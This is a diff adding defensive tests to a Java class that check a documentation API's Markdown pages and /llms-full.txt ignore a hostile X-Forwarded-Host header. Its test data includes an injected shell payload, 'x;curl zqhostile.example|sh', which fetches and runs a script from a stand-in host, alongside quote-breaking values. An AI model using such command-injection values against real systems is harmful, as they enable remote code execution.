@@ -38,8 +38,41 @@ class HostileForwardedHostTest {
                 .body(not(containsString("zqhostile")));
     }
 
+    // 2.14.0: the Markdown copies and /llms-full.txt carry the host in samples
+    // too. Pairs in the same response: no hostile host, and the content is there.
+    @ParameterizedTest(name = "{0} with X-Forwarded-Host [{1}]")
+    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
+            "/docs/mcp.md | `x;curl zqhostile.example|sh` | claude mcp add --transport http swapi-build http://localhost",
+            "/docs/mcp.md | `zqhostile example` | claude mcp add --transport http swapi-build http://localhost",
+            "/resource/films/1.md | `zqhostile'example` | curl http://localhost",
+            "/index.html.md | `zqhostile\"example` | # The Star Wars API",
+    })
+    void markdownCopyIgnoresAHostileForwardedHost(String path, String hostile, String content) {
+        given()
+                .header("X-Forwarded-Host", hostile)
+                .when().get(path)
+                .then().statusCode(200)
+                .body(containsString(content))
+                .body(not(containsString("zqhostile")))
+                .header("Link", not(containsString("zqhostile")));
+    }
+
+    @ParameterizedTest(name = "/llms-full.txt with X-Forwarded-Host [{0}]")
+    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
+            "`x;curl zqhostile.example|sh`",
+            "`zqhostile'example`",
+    })
+    void llmsFullIgnoresAHostileForwardedHost(String hostile) {
+        given()
+                .header("X-Forwarded-Host", hostile)
+                .when().get("/llms-full.txt")
+                .then().statusCode(200)
+                .body(containsString("claude mcp add --transport http swapi-build http://localhost"))
+                .body(not(containsString("zqhostile")));
+    }
+
     @ParameterizedTest(name = "{0}")
-    @CsvSource({"/docs/mcp", "/resource/films/1"})
+    @CsvSource({"/docs/mcp", "/resource/films/1", "/docs/mcp.md", "/resource/films/1.md", "/llms-full.txt"})
     void aPlainForwardedHostStillDecides(String path) {
         given()
                 .header("X-Forwarded-Host", "preview.example")
